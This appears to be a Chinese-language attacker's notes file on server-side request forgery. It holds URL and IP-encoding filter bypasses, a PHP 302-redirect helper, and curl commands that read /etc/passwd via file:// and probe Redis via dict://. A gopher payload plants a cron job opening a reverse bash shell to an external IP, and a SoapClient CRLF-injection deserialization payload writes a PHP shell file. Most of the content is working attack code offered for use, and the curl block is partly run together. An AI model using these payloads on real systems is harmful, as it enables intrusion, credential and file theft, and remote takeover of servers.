# ssrf

## 绕过小技巧

1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的

2.各种IP地址的进制转换

3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/

4.短网址绕过 http://t.cn/RwbLKDx

5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）

指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)

6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80

7.探测内网域名，或者将自己的域名解析到内网ip

8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，

但这样可以用 http://abc@10.153.138.81/ 绕过

## 收藏

 [https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html](https://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html) 

## 利用302跳转等来绕过协议限制

当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL

那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。

我们继续构造一个302跳转服务，代码如下302.php:

```php
<?php  
    $schema = $_GET['s'];
	$ip     = $_GET['i'];
	$port   = $_GET['p'];
	$query  = $_GET['q'];
	if(empty($port))
    {      
		header("Location:$schema://$ip/$query"); 
    }else 
    {
        header("Location: $schema://$ip:$port/$query"); 
    }
```



#### 利用测试

```
# dict protocol - 探测Redisdict://127.0.0.1:6379/info  curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'# file protocol - 任意文件读取curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&query=/etc/passwd'# gopher protocol - 一键反弹Bash# * 注意: gopher跳转的时候转义和`url`入参的方式有些区别curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&i=127.0.0.1&p=6389&query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  %0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```



## soap

 https://www.anquanke.com/post/id/153065#h2-5 

### 利用条件

调用soap的`__call`方法

### payload

```
<?php
$target = 'http://127.0.0.1/test.php';
$post_string = '1=file_put_contents("shell.php", "<?php phpinfo();?>");';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
    );
$b = new SoapClient(null,array('location' => $target,
'user_agent'=>'wupco^^Content-Type:application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length:'.(string)strlen($post_string).'^^^^'.$post_string,
'uri'=> "aaab"));
//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求
$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);

$c=unserialize(urldecode($aaa));
$c->ss();  //调用_call方法触发网络请求发送
?>
```





## gopher





## 绕过

利用`http://example.com@evil.com`来绕过

利用ip地址的不同形式绕过

1. 0177.00.00.01(八进制)
2. 2130706433（十进制）
3. 0x7f.0x0.0x0.0x1
4. 127.1（IP地址省略写法）

域名解析绕过

